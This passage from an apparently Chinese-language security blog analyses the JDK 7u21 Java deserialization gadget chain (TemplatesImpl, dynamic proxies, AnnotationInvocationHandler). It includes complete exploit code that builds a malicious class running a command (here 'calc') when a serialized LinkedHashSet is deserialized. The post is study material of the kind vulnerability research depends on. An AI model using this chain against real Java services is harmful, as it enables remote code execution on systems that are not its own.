class="function">       <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="comment">//_bytecodes不能为null</span></span><br><span class="line">       <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">               <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">       <span class="comment">//获取_bytecodes的长度，创建_class数组，这里需要让恶意类的字节码为一个二维字节数组</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">           _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">               _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// 恶意类的父类必须是ABSTRACT_TRANSLET</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">else</span> &#123;</span><br><span class="line">                   _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">           ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myjdk7u21</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装setFieldValue()方法，便于给类字段赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        ClassPool pool =ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//创建恶意类Evil</span></span><br><span class="line">        CtClass cc=pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置恶意类父类为AbstractTranslet</span></span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建恶意类的构造函数，写入payload</span></span><br><span class="line">        CtConstructor cons=<span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;,cc);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将Evil类转换成byte数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] TempByteCode=cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] ByteCode=<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;TempByteCode&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化TemplatesImpl类</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//为TemplatesImpl类的各个字段赋值</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,ByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60860e00038f1.jpg"></p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>当没有没有触发<code>getOutputProperties()</code>的点，就需要使用动态代理，代理是为了在不改变目标对象方法的情况下对方法进行增强</p>
<p>动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际的需要被代理的对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubjectImpl</span> <span class="keyword">implements</span> <span class="title">ISubject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;SubjectImpl.hello(): &quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Handler对象（继承InvocationHandler的拦截器）</span></span><br><span class="line"><span class="comment">//InvocationHandler是一个用于跟Proxy类对接的接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line">    <span class="comment">//构造函数，传入被代理实现类的实例</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Handler</span><span class="params">(Object subject)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//所有被Proxy拦截的函数都会经过这个接口的invoke函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;before!&quot;</span>);</span><br><span class="line">        <span class="comment">//完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数</span></span><br><span class="line">        method.invoke(<span class="keyword">this</span>.subject, args);</span><br><span class="line">        System.out.println(<span class="string">&quot;after!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//被代理类</span></span><br><span class="line">        SubjectImpl subject = <span class="keyword">new</span> SubjectImpl();</span><br><span class="line">        <span class="comment">//拦截器实现类，通过构造函数传入被代理类的实例</span></span><br><span class="line">        InvocationHandler tempHandler = <span class="keyword">new</span> Handler(subject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用Proxy.newProxyInstance创建代理</span></span><br><span class="line">        ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ISubject.class&#125;, tempHandler);</span><br><span class="line">        iSubject.hello(<span class="string">&quot;world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>Proxy.newProxyInstance</code>三个传入参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loader，选用的类加载器。</span><br><span class="line">interfaces，被代理类所实现的接口，这个接口可以是多个。即需要拦截的接口</span><br><span class="line">handler，一个 实现拦截器的invocation handler。</span><br></pre></td></tr></table></figure>

<p>设置动态代理后，只要调用了返回对象中被安排代理的接口，就会进入invocationHandler的invoke函数。</p>
<h1 id="延长利用链：AnnotationInvocationHandler"><a href="#延长利用链：AnnotationInvocationHandler" class="headerlink" title="延长利用链：AnnotationInvocationHandler"></a>延长利用链：AnnotationInvocationHandler</h1><p><code>AnnotationInvocationHandler</code>是一个<code>InvocationHandler</code>的实现类</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler</p>
<p>先看一下<code>AnnotationInvocationHandler</code>的构造函数</p>
<p>在payload构造中传入参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br></pre></td></tr></table></figure>

<p>这样</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.type=Templates.class</span><br><span class="line"><span class="keyword">this</span>.membervalues=map</span><br></pre></td></tr></table></figure>

<p>这里的AnnotationInvocationHandler构造函数是缺省修饰符，在不同的包中是不能直接调用</p>
<p>反射机制中提到，可以使用setAccessible(true)来开放权限。</p>
<p><img src="https://www.hualigs.cn/image/60860dfe3a000.jpg"></p>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Myjdk7u21</span> </span>&#123;</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射为obj的属性赋值</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装了之前对恶意TemplatesImpl类的构造</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> TemplatesImpl <span class="title">getEvilTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">&quot;Evil&quot;</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123; Runtime.getRuntime().exec(\&quot;calc\&quot;); &#125;&quot;</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCode = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCode&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,targetByteCode);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl templates=getEvilTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler</span></span><br><span class="line">        Constructor ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(Myjdk7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);</span><br><span class="line"></span><br><span class="line">        LinkedHashSet set = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] obj=serialize(set);</span><br><span class="line">        unserialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>反序列化<code>LinkedHashSet</code>类就可以执行命令。</p>
<p>Java在反序列化的时候会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法。</p>
<p><code>LinkedHashSet</code>类没有<code>readObject()</code>，但是它的父类<code>HashSet</code>存在<code>readObject()</code>，两者都继承了<code>Serializable接口</code></p>
<p><code>readObject()</code>中把Templates和proxy加入到map</p>
<p><img src="https://www.hualigs.cn/image/60860dff2a649.jpg">进入<code>put()</code>，</p>
<p>这里会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。</p>
<p>关键点在于<code>key.equals(k)</code>，添加的顺序是，前一个为 <code>templates</code> 后一个为<code>proxy</code>。</p>
<p>要到达<code>key.equals(k)</code>需要先满足条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code>，这个条件下面再说</p>
<p><img src="https://www.hualigs.cn/image/60860dff2ac6e.jpg">根据<code>||</code>的规则，第一个值为false时才能进入第二个。此时，<code>key</code>等于<code>proxy</code>，<code>e.key</code>等于<code>templates</code>类，这样<code>(k = e.key) == key</code>返回<code>false</code>。进入<code>key.equals(k)</code></p>
<p><img src="https://www.hualigs.cn/image/60860dfb93047.jpg"></p>
<p><img src="https://www.hualigs.cn/image/60860dfca013a.jpg"></p>
<p>由于使用了动态代理，调用<code>Templates.equals()</code>就会进入<code>AnnotaionlnvocationHandler</code>的<code>invoke()</code>，然后因为满足if条件进入<code>equalsImpl</code>。</p>
<p>这里的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var1为当前proxy代理实例对象，等于之前的key</span><br><span class="line">var2为当前调用方法，等于equals方法对象</span><br><span class="line">var3为当前调用方法的传入参数列表，等于TemplatesImpl类，也就是之前的k和e.key</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60860dffb6202.jpg"><img src="https://www.hualigs.cn/image/60860dfd0fbee.jpg"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
<p>进入<code>equalsImpl()</code>，前两个条件都不满足，进入<code>getMemberMethods</code></p>
<p><img src="https://www.hualigs.cn/image/60860e00495d7.jpg"></p>
<p><img src="https://www.hualigs.cn/image/60860dfda31d0.jpg"></p>
<p><img src="https://www.hualigs.cn/image/60860dfda23b5.jpg"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</p>
<p>满足条件<code>this.memberMethods</code>，<code>this.type</code>等于<code>Templates</code>，这样就会返回<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code></p>
<p><img src="https://www.hualigs.cn/image/60860dff52113.jpg"></p>
<p>回到<code>equalsImpl</code>，这里会获取<code>this.type</code>类中所有的方法，然后遍历并调用每一个方法。这里让<code>this.type</code>等于<code>Templates</code>接口就可以调用<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code>，触发payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;<span class="comment">//var1等于构造好的templates</span></span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="keyword">this</span>.getMemberMethods();<span class="comment">//var2为Templates的所有方法</span></span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;<span class="comment">//var3为Templates方法的数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;<span class="comment">//迭代Templates的所有方法</span></span><br><span class="line">            Method var5 = var2[var4];<span class="comment">//var5为Templates的中的某个方法</span></span><br><span class="line">            String var6 = var5.getName();<span class="comment">//var6为该方法的名称</span></span><br><span class="line">            Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null</span></span><br><span class="line">            Object var8 = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);<span class="comment">//var9也为null</span></span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);<span class="comment">//运行会到这里，所以会调用Templates中的所有方法</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行成功</p>
